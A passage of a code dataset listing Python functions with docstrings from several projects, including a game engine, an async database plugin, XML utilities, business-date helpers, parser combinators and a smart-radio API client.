f':\\n{response.text}')\n                return self.parse_conll(texts, retry_count + 1)"
        ],
        [
            "def set_data(self, data={}, datetime_fields=[]):\n        \"\"\" Set entity data\n\n        Args:\n            data (dict): Entity data\n            datetime_fields (array): Fields that should be parsed as datetimes\n        \"\"\"\n        if datetime_fields:\n            for field in datetime_fields:\n                if field in data:\n                    data[field] = self._parse_datetime(data[field])\n\n        super(CampfireEntity, self).set_data(data)"
        ],
        [
            "def validate_xml_text(text):\n    \"\"\"validates XML text\"\"\"\n    bad_chars = __INVALID_XML_CHARS & set(text)\n    if bad_chars:\n        for offset,c in enumerate(text):\n            if c in bad_chars:\n                raise RuntimeError('invalid XML character: ' + repr(c) + ' at offset ' + str(offset))"
        ],
        [
            "def validate_xml_name(name):\n    \"\"\"validates XML name\"\"\"\n    if len(name) == 0:\n        raise RuntimeError('empty XML name')\n\n    if __INVALID_NAME_CHARS & set(name):\n        raise RuntimeError('XML name contains invalid character')\n\n    if name[0] in __INVALID_NAME_START_CHARS:\n        raise RuntimeError('XML name starts with invalid character')"
        ],
        [
            "def on_enter_stage(self):\n        \"\"\"\n        Prepare the actors, the world, and the messaging system to begin \n        playing the game.\n        \n        This method is guaranteed to be called exactly once upon entering the \n        game stage.\n        \"\"\"\n        with self.world._unlock_temporarily():\n            self.forum.connect_everyone(self.world, self.actors)\n\n        # 1. Setup the forum.\n\n        self.forum.on_start_game()\n\n        # 2. Setup the world.\n\n        with self.world._unlock_temporarily():\n            self.world.on_start_game()\n\n        # 3. Setup the actors.  Because this is done after the forum and the  \n        #    world have been setup, this signals to the actors that they can \n        #    send messages and query the game world as usual.\n\n        num_players = len(self.actors) - 1\n\n        for actor in self.actors:\n            actor.on_setup_gui(self.gui)\n\n        for actor in self.actors:\n            actor.on_start_game(num_players)"
        ],
        [
            "def on_update_stage(self, dt):\n        \"\"\"\n        Sequentially update the actors, the world, and the messaging system.  \n        The theater terminates once all of the actors indicate that they are done.\n        \"\"\"\n\n        for actor in self.actors:\n            actor.on_update_game(dt)\n\n        self.forum.on_update_game()\n\n        with self.world._unlock_temporarily():\n            self.world.on_update_game(dt)\n\n        if self.world.has_game_ended():\n            self.exit_stage()"
        ],
        [
            "def on_exit_stage(self):\n        \"\"\"\n        Give the actors, the world, and the messaging system a chance to react \n        to the end of the game.\n        \"\"\"\n\n        # 1. Let the forum react to the end of the game.  Local forums don't \n        #    react to this, but remote forums take the opportunity to stop \n        #    trying to extract tokens from messages.\n\n        self.forum.on_finish_game()\n\n        # 2. Let the actors react to the end of the game.\n\n        for actor in self.actors:\n            actor.on_finish_game()\n\n        # 3. Let the world react to the end of the game.\n\n        with self.world._unlock_temporarily():\n            self.world.on_finish_game()"
        ],
        [
            "def render_vars(self):\n        \"\"\"Template variables.\"\"\"\n        return {\n            'records': [\n                {\n                    'message': record.getMessage(),\n                    'time': dt.datetime.fromtimestamp(record.created).strftime('%H:%M:%S'),\n                } for record in self.handler.records\n            ]\n        }"
        ],
        [
            "def init_async(self, loop=None):\n        \"\"\"Use when application is starting.\"\"\"\n        self._loop = loop or asyncio.get_event_loop()\n        self._async_lock = asyncio.Lock(loop=loop)\n\n        # FIX: SQLITE in memory database\n        if not self.database == ':memory:':\n            self._state = ConnectionLocal()"
        ],
        [
            "async def async_connect(self):\n        \"\"\"Catch a connection asyncrounosly.\"\"\"\n        if self._async_lock is None:\n            raise Exception('Error, database not properly initialized before async connection')\n\n        async with self._async_lock:\n            self.connect(True)\n\n        return self._state.conn"
        ],
        [
            "def init_async(self, loop):\n        \"\"\"Initialize self.\"\"\"\n        super(PooledAIODatabase, self).init_async(loop)\n        self._waiters = collections.deque()"
        ],
        [
            "async def async_connect(self):\n        \"\"\"Asyncronously wait for a connection from the pool.\"\"\"\n        if self._waiters is None:\n            raise Exception('Error, database not properly initialized before async connection')\n\n        if self._waiters or self.max_connections and (len(self._in_use) >= self.max_connections):\n            waiter = asyncio.Future(loop=self._loop)\n            self._waiters.append(waiter)\n\n            try:\n                logger.debug('Wait for connection.')\n                await waiter\n            finally:\n                self._waiters.remove(waiter)\n\n        self.connect()\n        return self._state.conn"
        ],
        [
            "def _close(self, conn):\n        \"\"\"Release waiters.\"\"\"\n        super(PooledAIODatabase, self)._close(conn)\n        for waiter in self._waiters:\n            if not waiter.done():\n                logger.debug('Release a waiter')\n                waiter.set_result(True)\n                break"
        ],
        [
            "def receive_id_from_server(self):\n        \"\"\"\n        Listen for an id from the server.\n\n        At the beginning of a game, each client receives an IdFactory from the \n        server.  This factory are used to give id numbers that are guaranteed \n        to be unique to tokens that created locally.  This method checks to see if such \n        a factory has been received.  If it hasn't, this method does not block \n        and immediately returns False.  If it has, this method returns True \n        after saving the factory internally.  At this point it is safe to enter \n        the GameStage.\n        \"\"\"\n        for message in self.pipe.receive():\n            if isinstance(message, IdFactory):\n                self.actor_id_factory = message\n                return True\n        return False"
        ],
        [
            "def execute_sync(self, message):\n        \"\"\"\n        Respond when the server indicates that the client is out of sync.\n\n        The server can request a sync when this client sends a message that \n        fails the check() on the server.  If the reason for the failure isn't \n        very serious, then the server can decide to send it as usual in the \n        interest of a smooth gameplay experience.  When this happens, the \n        server sends out an extra response providing the clients with the\n        information they need to resync themselves.\n        \"\"\"\n        info(\"synchronizing message: {message}\")\n\n        # Synchronize the world.\n\n        with self.world._unlock_temporarily():\n            message._sync(self.world)\n            self.world._react_to_sync_response(message)\n\n        # Synchronize the tokens.\n\n        for actor in self.actors:\n            actor._react_to_sync_response(message)"
        ],
        [
            "def execute_undo(self, message):\n        \"\"\"\n        Manage the response when the server rejects a message.\n\n        An undo is when required this client sends a message that the server \n        refuses to pass on to the other clients playing the game.  When this \n        happens, the client must undo the changes that the message made to the \n        world before being sent or crash.  Note that unlike sync requests, undo \n        requests are only reported to the client that sent the offending \n        message.\n        \"\"\"\n        info(\"undoing message: {message}\")\n\n        # Roll back changes that the original message made to the world.\n\n        with self.world._unlock_temporarily():\n            message._undo(self.world)\n            self.world._react_to_undo_response(message)\n\n        # Give the actors a chance to react to the error.  For example, a \n        # GUI actor might inform the user that there are connectivity \n        # issues and that their last action was countermanded.\n\n        for actor in self.actors:\n            actor._react_to_undo_response(message)"
        ],
        [
            "def _relay_message(self, message):\n        \"\"\"\n        Relay messages from the forum on the server to the client represented \n        by this actor.\n        \"\"\"\n        info(\"relaying message: {message}\")\n\n        if not message.was_sent_by(self._id_factory):\n            self.pipe.send(message)\n            self.pipe.deliver()"
        ],
        [
            "def generate(request):\n    \"\"\" Create a new DataItem. \"\"\"\n    models.DataItem.create(\n        content=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))\n    )\n    return muffin.HTTPFound('/')"
        ],
        [
            "def require_active_token(object):\n    \"\"\"\n    Raise an ApiUsageError if the given object is not a token that is currently \n    participating in the game.  To be participating in the game, the given \n    token must have an id number and be associated with the world.\n    \"\"\"\n    require_token(object)\n    token = object\n\n    if not token.has_id:\n        raise ApiUsageError(\"\"\"\\\n                token {token} should have an id, but doesn't.\n\n                This error usually means that a token was added to the world \n                without being assigned an id number.  To correct this, make \n                sure that you're using a message (i.e. CreateToken) to create \n                all of your tokens.\"\"\")\n\n    if not token.has_world:\n        raise ApiUsageError(\"\"\"\\\n                token {token} (id={token.id}) not in world.\n\n                You can get this error if you try to remove the same token from \n                the world twice.  This might happen is you don't get rid of \n                every reference to a token after it's removed the first time, \n                then later on you try to remove the stale reference.\"\"\")"
        ],
        [
            "def add_safety_checks(meta, members):\n        \"\"\"\n        Iterate through each member of the class being created and add a \n        safety check to every method that isn't marked as read-only.\n        \"\"\"\n        for member_name, member_value in members.items():\n            members[member_name] = meta.add_safety_check(\n                    member_name, member_value)"
        ],
        [
            "def watch_method(self, method_name, callback):\n        \"\"\"\n        Register the given callback to be called whenever the method with the \n        given name is called.  You can easily take advantage of this feature in \n        token extensions by using the @watch_token decorator.\n        \"\"\"\n\n        # Make sure a token method with the given name exists, and complain if \n        # nothing is found.\n\n        try:\n            method = getattr(self, method_name)\n        except AttributeError:\n            raise ApiUsageError(\"\"\"\\\n                    {self.__class__.__name__} has no such method \n                    {method_name}() to watch.\n\n                    This error usually means that you used the @watch_token \n                    decorator on a method of a token extension class that \n                    didn't match the name of any method in the corresponding \n                    token class.  Check for typos.\"\"\")\n\n        # Wrap the method in a WatchedMethod object, if that hasn't already \n        # been done.  This object manages a list of callback method and takes \n        # responsibility for calling them after the method itself has been \n        # called.\n\n        if not isinstance(method, Token.WatchedMethod):\n            setattr(self, method_name, Token.WatchedMethod(method))\n            method = getattr(self, method_name)\n\n        # Add the given callback to the watched method.\n\n        method.add_watcher(callback)"
        ],
        [
            "def _remove_from_world(self):\n        \"\"\"\n        Clear all the internal data the token needed while it was part of \n        the world.\n\n        Note that this method doesn't actually remove the token from the \n        world.  That's what World._remove_token() does.  This method is just \n        responsible for setting the internal state of the token being removed.\n        \"\"\"\n        self.on_remove_from_world()\n        self._extensions = {}\n        self._disable_forum_observation()\n        self._world = None\n        self._id = None"
        ],
        [
            "def _unlock_temporarily(self):\n        \"\"\"\n        Allow tokens to modify the world for the duration of a with-block.\n\n        It's important that tokens only modify the world at appropriate times, \n        otherwise the changes they make may not be communicated across the \n        network to other clients.  To help catch and prevent these kinds of \n        errors, the game engine keeps the world locked most of the time and \n        only briefly unlocks it (using this method) when tokens are allowed to \n        make changes.  When the world is locked, token methods that aren't \n        marked as being read-only can't be called.  When the world is unlocked, \n        any token method can be called.  These checks can be disabled by \n        running python with optimization enabled.\n\n        You should never call this method manually from within your own game.  \n        This method is intended to be used by the game engine, which was \n        carefully designed to allow the world to be modified only when safe.  \n        Calling this method yourself disables an important safety check.\n        \"\"\"\n        if not self._is_locked:\n            yield\n        else:\n            try:\n                self._is_locked = False\n                yield\n            finally:\n                self._is_locked = True"
        ],
        [
            "def scan(xml):\n    \"\"\"Converts XML tree to event generator\"\"\"\n\n    if xml.tag is et.Comment:\n        yield {'type': COMMENT, 'text': xml.text}\n        return\n\n    if xml.tag is et.PI:\n        if xml.text:\n            yield {'type': PI, 'target': xml.target, 'text': xml.text}\n        else:\n            yield {'type': PI, 'target': xml.target}\n        return\n\n    obj = _elt2obj(xml)\n    obj['type'] = ENTER\n    yield obj\n\n    assert type(xml.tag) is str, xml\n    if xml.text:\n        yield {'type': TEXT, 'text': xml.text}\n\n    for c in xml:\n        for x in scan(c): yield x\n        if c.tail:\n            yield {'type': TEXT, 'text': c.tail}\n\n    yield {'type': EXIT}"
        ],
        [
            "def unscan(events, nsmap=None):\n    \"\"\"Converts events stream into lXML tree\"\"\"\n\n    root = None\n    last_closed_elt = None\n    stack = []\n    for obj in events:\n\n        if obj['type'] == ENTER:\n            elt = _obj2elt(obj, nsmap=nsmap)\n            if stack:\n                stack[-1].append(elt)\n            elif root is not None:\n                raise RuntimeError('Event stream tried to create second XML tree')\n            else:\n                root = elt\n            stack.append(elt)\n            last_closed_elt = None\n\n        elif obj['type'] == EXIT:\n            last_closed_elt = stack.pop()\n\n        elif obj['type'] == COMMENT:\n            elt = et.Comment(obj['text'])\n            stack[-1].append(elt)\n\n        elif obj['type'] == PI:\n            elt = et.PI(obj['target'])\n            if obj.get('text'):\n                elt.text = obj['text']\n            stack[-1].append(elt)\n\n        elif obj['type'] == TEXT:\n            text = obj['text']\n            if text:\n                if last_closed_elt is None:\n                    stack[-1].text = (stack[-1].text or '') + text\n                else:\n                    last_closed_elt.tail = (last_closed_elt.tail or '') + text\n        else:\n            assert False, obj\n\n    if root is None:\n        raise RuntimeError('Empty XML event stream')\n\n    return root"
        ],
        [
            "def parse(filename):\n    \"\"\"Parses file content into events stream\"\"\"\n    for event, elt in et.iterparse(filename, events= ('start', 'end', 'comment', 'pi'), huge_tree=True):\n        if event == 'start':\n            obj = _elt2obj(elt)\n            obj['type'] = ENTER\n            yield obj\n            if elt.text:\n                yield {'type': TEXT, 'text': elt.text}\n        elif event == 'end':\n            yield {'type': EXIT}\n            if elt.tail:\n                yield {'type': TEXT, 'text': elt.tail}\n            elt.clear()\n        elif event == 'comment':\n            yield {'type': COMMENT, 'text': elt.text}\n        elif event == 'pi':\n            yield {'type': PI, 'text': elt.text}\n        else:\n            assert False, (event, elt)"
        ],
        [
            "def subtree(events):\n    \"\"\"selects sub-tree events\"\"\"\n    stack = 0\n    for obj in events:\n        if obj['type'] == ENTER:\n            stack += 1\n        elif obj['type'] == EXIT:\n            if stack == 0:\n                break\n            stack -= 1\n        yield obj"
        ],
        [
            "def merge_text(events):\n    \"\"\"merges each run of successive text events into one text event\"\"\"\n    text = []\n    for obj in events:\n        if obj['type'] == TEXT:\n            text.append(obj['text'])\n        else:\n            if text:\n                yield {'type': TEXT, 'text': ''.join(text)}\n                text.clear()\n            yield obj\n    if text:\n        yield {'type': TEXT, 'text': ''.join(text)}"
        ],
        [
            "def with_peer(events):\n    \"\"\"locates ENTER peer for each EXIT object. Convenient when selectively\n    filtering out XML markup\"\"\"\n\n    stack = []\n    for obj in events:\n        if obj['type'] == ENTER:\n            stack.append(obj)\n            yield obj, None\n        elif obj['type'] == EXIT:\n            yield obj, stack.pop()\n        else:\n            yield obj, None"
        ],
        [
            "def from_date(datetime_date):\n        \"\"\"\n        construct BusinessDate instance from datetime.date instance,\n        raise ValueError exception if not possible\n\n        :param datetime.date datetime_date: calendar day\n        :return bool:\n        \"\"\"\n        return BusinessDate.from_ymd(datetime_date.year, datetime_date.month, datetime_date.day)"
        ],
        [
            "def to_date(self):\n        \"\"\"\n        construct datetime.date instance represented calendar date of BusinessDate instance\n\n        :return datetime.date:\n        \"\"\"\n        y, m, d = self.to_ymd()\n        return date(y, m, d)"
        ],
        [
            "def add_period(self, p, holiday_obj=None):\n        \"\"\"\n        addition of a period object\n\n        :param BusinessDate d:\n        :param p:\n        :type p: BusinessPeriod or str\n        :param list holiday_obj:\n        :return bankdate:\n        \"\"\"\n\n        if isinstance(p, (list, tuple)):\n            return [BusinessDate.add_period(self, pd) for pd in p]\n        elif isinstance(p, str):\n            period = BusinessPeriod(p)\n        else:\n            period = p\n\n        res = self\n        res = BusinessDate.add_months(res, period.months)\n        res = BusinessDate.add_years(res, period.years)\n        res = BusinessDate.add_days(res, period.days)\n\n        if period.businessdays:\n            if holiday_obj:\n                res = BusinessDate.add_business_days(res, period.businessdays, holiday_obj)\n            else:\n                res = BusinessDate.add_business_days(res, period.businessdays, period.holiday)\n\n        return res"
        ],
        [
            "def add_months(self, month_int):\n        \"\"\"\n        addition of a number of months\n\n        :param BusinessDate d:\n        :param int month_int:\n        :return bankdate:\n        \"\"\"\n\n        month_int += self.month\n        while month_int > 12:\n            self = BusinessDate.add_years(self, 1)\n            month_int -= 12\n        while month_int < 1:\n            self = BusinessDate.add_years(self, -1)\n            month_int += 12\n        l = monthrange(self.year, month_int)[1]\n        return BusinessDate.from_ymd(self.year, month_int, min(l, self.day))"
        ],
        [
            "def add_business_days(self, days_int, holiday_obj=None):\n        \"\"\"\n        private method for the addition of business days, used in the addition of a BusinessPeriod only\n\n        :param BusinessDate d:\n        :param int days_int:\n        :param list holiday_obj:\n        :return: BusinessDate\n        \"\"\"\n\n        res = self\n        if days_int >= 0:\n            count = 0\n            while count < days_int:\n                res = BusinessDate.add_days(res, 1)\n                if BusinessDate.is_business_day(res, holiday_obj):\n                    count += 1\n        else:\n            count = 0\n            while count > days_int:\n                res = BusinessDate.add_days(res, -1)\n                if BusinessDate.is_business_day(res, holiday_obj):\n                    count -= 1\n\n        return res"
        ],
        [
            "def quoted(parser=any_token):\n    \"\"\"Parses as much as possible until it encounters a matching closing quote.\n    \n    By default matches any_token, but can be provided with a more specific parser if required.\n    Returns a string\n    \"\"\"\n    quote_char = quote()\n    value, _ = many_until(parser, partial(one_of, quote_char))\n    return build_string(value)"
        ],
        [
            "def days_in_month(year, month):\n    \"\"\"\n    returns number of days for the given year and month\n\n    :param int year: calendar year\n    :param int month: calendar month\n    :return int:\n    \"\"\"\n\n    eom = _days_per_month[month - 1]\n    if is_leap_year(year) and month == 2:\n        eom += 1\n\n    return eom"
        ],
        [
            "def setup(self, app):  # noqa\n        \"\"\"Initialize the application.\"\"\"\n        super().setup(app)\n\n        # Setup Database\n        self.database.initialize(connect(self.cfg.connection, **self.cfg.connection_params))\n\n        # Fix SQLite in-memory database\n        if self.database.database == ':memory:':\n            self.cfg.connection_manual = True\n\n        if not self.cfg.migrations_enabled:\n            return\n\n        # Setup migration engine\n        self.router = Router(self.database, migrate_dir=self.cfg.migrations_path)\n\n        # Register migration commands\n        def pw_migrate(name: str=None, fake: bool=False):\n            \"\"\"Run application's migrations.\n\n            :param name: Choose a migration' name\n            :param fake: Run as fake. Update migration history and don't touch the database\n            \"\"\"\n            self.router.run(name, fake=fake)\n\n        self.app.manage.command(pw_migrate)\n\n        def pw_rollback(name: str=None):\n            \"\"\"Rollback a migration.\n\n            :param name: Migration name (actually it always should be a last one)\n            \"\"\"\n            if not name:\n                name = self.router.done[-1]\n            self.router.rollback(name)\n\n        self.app.manage.command(pw_rollback)\n\n        def pw_create(name: str='auto', auto: bool=False):\n            \"\"\"Create a migration.\n\n            :param name: Set name of migration [auto]\n            :param auto: Track changes and setup migrations automatically\n            \"\"\"\n            if auto:\n                auto = list(self.models.values())\n            self.router.create(name, auto)\n\n        self.app.manage.command(pw_create)\n\n        def pw_list():\n            \"\"\"List migrations.\"\"\"\n            self.router.logger.info('Migrations are done:')\n            self.router.logger.info('\\n'.join(self.router.done))\n            self.router.logger.info('')\n            self.router.logger.info('Migrations are undone:')\n            self.router.logger.info('\\n'.join(self.router.diff))\n\n        self.app.manage.command(pw_list)\n\n        @self.app.manage.command\n        def pw_merge():\n            \"\"\"Merge migrations into one.\"\"\"\n            self.router.merge()\n\n        self.app.manage.command(pw_merge)"
        ],
        [
            "def startup(self, app):\n        \"\"\"Register connection's middleware and prepare self database.\"\"\"\n        self.database.init_async(app.loop)\n        if not self.cfg.connection_manual:\n            app.middlewares.insert(0, self._middleware)"
        ],
        [
            "def cleanup(self, app):\n        \"\"\"Close all connections.\"\"\"\n        if hasattr(self.database.obj, 'close_all'):\n            self.database.close_all()"
        ],
        [
            "def register(self, model):\n        \"\"\"Register a model in self.\"\"\"\n        self.models[model._meta.table_name] = model\n        model._meta.database = self.database\n        return model"
        ],
        [
            "async def manage(self):\n        \"\"\"Manage a database connection.\"\"\"\n        cm = _ContextManager(self.database)\n        if isinstance(self.database.obj, AIODatabase):\n            cm.connection = await self.database.async_connect()\n\n        else:\n            cm.connection = self.database.connect()\n\n        return cm"
        ],
        [
            "def migrate(migrator, database, **kwargs):\n    \"\"\" Write your migrations here.\n\n    > Model = migrator.orm['name']\n\n    > migrator.sql(sql)\n    > migrator.create_table(Model)\n    > migrator.drop_table(Model, cascade=True)\n    > migrator.add_columns(Model, **fields)\n    > migrator.change_columns(Model, **fields)\n    > migrator.drop_columns(Model, *field_names, cascade=True)\n    > migrator.rename_column(Model, old_field_name, new_field_name)\n    > migrator.rename_table(Model, new_table_name)\n    > migrator.add_index(Model, *col_names, unique=False)\n    > migrator.drop_index(Model, index_name)\n    > migrator.add_not_null(Model, field_name)\n    > migrator.drop_not_null(Model, field_name)\n    > migrator.add_default(Model, field_name, default)\n\n    \"\"\"\n    @migrator.create_table\n    class DataItem(pw.Model):\n        created = pw.DateTimeField(default=dt.datetime.utcnow)\n        content = pw.CharField()"
        ],
        [
            "def chain(*args):\n    \"\"\"Runs a series of parsers in sequence passing the result of each parser to the next.\n    The result of the last parser is returned.\n    \"\"\"\n    def chain_block(*args, **kwargs):\n        v = args[0](*args, **kwargs)\n        for p in args[1:]:\n            v = p(v)\n        return v\n    return chain_block"
        ],
        [
            "def one_of(these):\n    \"\"\"Returns the current token if is found in the collection provided.\n    \n    Fails otherwise.\n    \"\"\"\n    ch = peek()\n    try:\n        if (ch is EndOfFile) or (ch not in these):\n            fail(list(these))\n    except TypeError:\n        if ch != these:\n            fail([these])\n    next()\n    return ch"
        ],
        [
            "def not_one_of(these):\n    \"\"\"Returns the current token if it is not found in the collection provided.\n    \n    The negative of one_of. \n    \"\"\"\n    ch = peek()\n    desc = \"not_one_of\" + repr(these)\n    try:\n        if (ch is EndOfFile) or (ch in these):\n            fail([desc])\n    except TypeError:\n        if ch != these:\n            fail([desc])\n    next()\n    return ch"
        ],
        [
            "def satisfies(guard):\n    \"\"\"Returns the current token if it satisfies the guard function provided.\n    \n    Fails otherwise.\n    This is the a generalisation of one_of.\n    \"\"\"\n    i = peek()\n    if (i is EndOfFile) or (not guard(i)):\n        fail([\"<satisfies predicate \" + _fun_to_str(guard) + \">\"])\n    next()\n    return i"
        ],
        [
            "def not_followed_by(parser):\n    \"\"\"Succeeds if the given parser cannot consume input\"\"\"\n    @tri\n    def not_followed_by_block():\n        failed = object()\n        result = optional(tri(parser), failed)\n        if result != failed:\n            fail([\"not \" + _fun_to_str(parser)])\n    choice(not_followed_by_block)"
        ],
        [
            "def many(parser):\n    \"\"\"Applies the parser to input zero or more times.\n    \n    Returns a list of parser results.\n    \"\"\"\n    results = []\n    terminate = object()\n    while local_ps.value:\n        result = optional(parser, terminate)\n        if result == terminate:\n            break\n        results.append(result)\n    return results"
        ],
        [
            "def many_until(these, term):\n    \"\"\"Consumes as many of these as it can until it term is encountered.\n    \n    Returns a tuple of the list of these results and the term result \n    \"\"\"\n    results = []\n    while True:\n        stop, result = choice(_tag(True, term),\n                              _tag(False, these))\n        if stop:\n            return results, result\n        else:\n            results.append(result)"
        ],
        [
            "def many_until1(these, term):\n    \"\"\"Like many_until but must consume at least one of these.\n    \"\"\"\n    first = [these()]\n    these_results, term_result = many_until(these, term)\n    return (first + these_results, term_result)"
        ],
        [
            "def sep1(parser, separator):\n    \"\"\"Like sep but must consume at least one of parser.\n    \"\"\"\n    first = [parser()]\n    def inner():\n        separator()\n        return parser()\n    return first + many(tri(inner))"
        ],
        [
            "def _fill(self, size):\n        \"\"\"fills the internal buffer from the source iterator\"\"\"\n        try:\n            for i in range(size):\n                self.buffer.append(self.source.next())\n        except StopIteration:\n            self.buffer.append((EndOfFile, EndOfFile))\n        self.len = len(self.buffer)"
        ],
        [
            "def next(self):\n        \"\"\"Advances to and returns the next token or returns EndOfFile\"\"\"\n        self.index += 1\n        t = self.peek()\n        if not self.depth:\n            self._cut()\n        return t"
        ],
        [
            "def main(world_cls, referee_cls, gui_cls, gui_actor_cls, ai_actor_cls,\n        theater_cls=PygletTheater, default_host=DEFAULT_HOST,\n        default_port=DEFAULT_PORT, argv=None):\n    \"\"\"\nRun a game being developed with the kxg game engine.\n\nUsage:\n    {exe_name} sandbox [<num_ais>] [-v...]\n    {exe_name} client [--host HOST] [--port PORT] [-v...]\n    {exe_name} server <num_guis> [<num_ais>] [--host HOST] [--port PORT] [-v...] \n    {exe_name} debug <num_guis> [<num_ais>] [--host HOST] [--port PORT] [-v...]\n    {exe_name} --help\n\nCommands:\n    sandbox\n        Play a single-player game with the specified number of AIs.  None of \n        the multiplayer machinery will be used.\n\n    client\n        Launch a client that will try to connect to a server on the given host \n        and port.  Once it connects and the game starts, the client will allow \n        you to play the game against any other connected clients.\n\n    server\n        Launch a server that will manage a game between the given number of \n        human and AI players.  The human players must connect using this \n        command's client mode.\n\n    debug\n        Debug a multiplayer game locally.  This command launches a server and \n        the given number of clients all in different processes, and configures \n        the logging system such that the output from each process can be easily \n        distinguished.\n\nArguments:\n    <num_guis>\n        The number of human players that will be playing the game.  Only needed \n        by commands that will launch some sort of multiplayer server.\n\n    <num_ais>\n        The number of AI players that will be playing the game.  Only needed by \n        commands that will launch single-player games or multiplayer servers.\n\nOptions:\n    -x --host HOST          [default: {default_host}]\n        The address of the machine running the server.  Must be accessible from \n        the machines running the clients.\n\n    -p --port PORT          [default: {default_port}]\n        The port that the server should listen on.  Don't specify a value less \n        than 1024 unless the server is running with root permissions.\n\n    -v --verbose \n        Have the game engine log more information about what it's doing.  You \n        can specify this option several times to get more and more information.\n\nThis command is provided so that you can start writing your game with the least \npossible amount of boilerplate code.  However, the clients and servers provided \nby this command are not capable of running a production game.  Once you have \nwritten your game and want to give it a polished set of menus and options, \nyou'll have to write new Stage subclasses encapsulating that logic and you'll \nhave to call those stages yourself by interacting more directly with the \nTheater class.  The online documentation has more information on this process.\n    \"\"\"\n    import sys, os, docopt, nonstdlib\n\n    exe_name = os.path.basename(sys.argv[0])\n    usage = main.__doc__.format(**locals()).strip()\n    args = docopt.docopt(usage, argv or sys.argv[1:])\n    num_guis = int(args['<num_guis>'] or 1)\n    num_ais = int(args['<num_ais>'] or 0)\n    host, port = args['--host'], int(args['--port'])\n\n    logging.basicConfig(\n            format='%(levelname)s: %(name)s: %(message)s',\n            level=nonstdlib.verbosity(args['--verbose']),\n    )\n\n    # Use the given game objects and command line arguments to play a game!\n\n    if args['debug']:\n        print(\"\"\"\\\n****************************** KNOWN BUG WARNING ******************************\nIn debug mode, every message produced by the logging system gets printed twice.\nI know vaguely why this is happening, but as of yet I've not been able to fix\nit.  In the mean time, don't let this confuse you!\n*******************************************************************************\"\"\")\n        game = MultiplayerDebugger(\n                world_cls, referee_cls, gui_cls, gui_actor_cls, num_guis,\n                ai_actor_cls, num_ais, theater_cls, host, port)\n    else:\n        game = theater_cls()\n        ai_actors = [ai_actor_cls() for i in range(num_ais)]\n\n        if args['sandbox']:\n            game.gui = gui_cls()\n            game.initial_stage = UniplayerGameStage(\n                    world_cls(), referee_cls(), gui_actor_cls(), ai_actors)\n            game.initial_stage.successor = PostgameSplashStage()\n\n        if args['client']:\n            game.gui = gui_cls()\n            game.initial_stage = ClientConnectionStage(\n                    world_cls(), gui_actor_cls(), host, port)\n\n        if args['server']:\n            game.initial_stage = ServerConnectionStage(\n                    world_cls(), referee_cls(), num_guis, ai_actors,\n                    host, port)\n\n    game.play()"
        ],
        [
            "def _run_supervisor(self):\n        \"\"\"\n        Poll the queues that the worker can use to communicate with the \n        supervisor, until all the workers are done and all the queues are \n        empty.  Handle messages as they appear.\n        \"\"\"\n        import time\n\n        still_supervising = lambda: (\n                multiprocessing.active_children()\n                or not self.log_queue.empty()\n                or not self.exception_queue.empty())\n\n        try:\n            while still_supervising():\n                # When a log message is received, make a logger with the same \n                # name in this process and use it to re-log the message.  It \n                # will get handled in this process.\n\n                try:\n                    record = self.log_queue.get_nowait()\n                    logger = logging.getLogger(record.name)\n                    logger.handle(record)\n                except queue.Empty:\n                    pass\n\n                # When an exception is received, immediately re-raise it.\n\n                try:\n                    exception = self.exception_queue.get_nowait()\n                except queue.Empty:\n                    pass\n                else:\n                    raise exception\n\n                # Sleep for a little bit, and make sure that the workers haven't \n                # outlived their time limit.\n\n                time.sleep(1/self.frame_rate)\n                self.elapsed_time += 1/self.frame_rate\n\n                if self.time_limit and self.elapsed_time > self.time_limit:\n                    raise RuntimeError(\"timeout\")\n\n        # Make sure the workers don't outlive the supervisor, no matter how the \n        # polling loop ended (e.g. normal execution or an exception).\n\n        finally:\n            for process in multiprocessing.active_children():\n                process.terminate()"
        ],
        [
            "def field_type(self):\n        \"\"\"Return database field type.\"\"\"\n        if not self.model:\n            return 'JSON'\n        database = self.model._meta.database\n        if isinstance(database, Proxy):\n            database = database.obj\n        if Json and isinstance(database, PostgresqlDatabase):\n            return 'JSON'\n        return 'TEXT'"
        ],
        [
            "def python_value(self, value):\n        \"\"\"Parse value from database.\"\"\"\n        if self.field_type == 'TEXT' and isinstance(value, str):\n            return self.loads(value)\n        return value"
        ],
        [
            "def get_fsapi_endpoint(self):\n        \"\"\"Parse the fsapi endpoint from the device url.\"\"\"\n        endpoint = yield from self.__session.get(self.fsapi_device_url, timeout = self.timeout)\n        text = yield from endpoint.text(encoding='utf-8')\n        doc = objectify.fromstring(text)\n        return doc.webfsapi.text"
        ],
        [
            "def create_session(self):\n        \"\"\"Create a session on the frontier silicon device.\"\"\"\n        req_url = '%s/%s' % (self.__webfsapi, 'CREATE_SESSION')\n        sid = yield from self.__session.get(req_url, params=dict(pin=self.pin),\n                                            timeout = self.timeout)\n        text = yield from sid.text(encoding='utf-8')\n        doc = objectify.fromstring(text)\n        return doc.sessionId.text"
        ],
        [
            "def call(self, path, extra=None):\n        \"\"\"Execute a frontier silicon API call.\"\"\"\n        try:\n            if not self.__webfsapi:\n                self.__webfsapi = yield from self.get_fsapi_endpoint()\n\n            if not self.sid:\n                self.sid = yield from self.create_session()\n\n            if not isinstance(extra, dict):\n                extra = dict()\n\n            params = dict(pin=self.pin, sid=self.sid)\n            params.update(**extra)\n\n            req_url = ('%s/%s' % (self.__webfsapi, path))\n            result = yield from self.__session.get(req_url, params=params,\n                                                   timeout = self.timeout)\n            if result.status == 200:\n                text = yield from result.text(encoding='utf-8')\n            else:\n                self.sid = yield from self.create_session()\n                params = dict(pin=self.pin, sid=self.sid)\n                params.update(**extra)\n                result = yield from self.__session.get(req_url, params=params,\n                                                       timeout = self.timeout)\n                text = yield from result.text(encoding='utf-8')\n\n            return objectify.fromstring(text)\n        except Exception as e:\n            logging.info('AFSAPI Exception: ' +traceback.format_exc())\n\n        return None"
        ],
        [
            "def handle_set(self, item, value):\n        \"\"\"Helper method for setting a value by using the fsapi API.\"\"\"\n        doc = yield from self.call('SET/{}'.format(item), dict(value=value))\n        if doc is None:\n            return None\n\n        return doc.status == 'FS_OK'"
        ],
        [
            "def handle_text(self, item):\n        \"\"\"Helper method for fetching a text value.\"\"\"\n        doc = yield from self.handle_get(item)\n        if doc is None:\n            return None\n\n        return doc.value.c8_array.text or None"
        ],
        [
            "def handle_int(self, item):\n        \"\"\"Helper method for fetching a integer value.\"\"\"\n        doc = yield from self.handle_get(item)\n        if doc is None:\n            return None\n\n        return int(doc.value.u8.text) or None"
        ],
        [
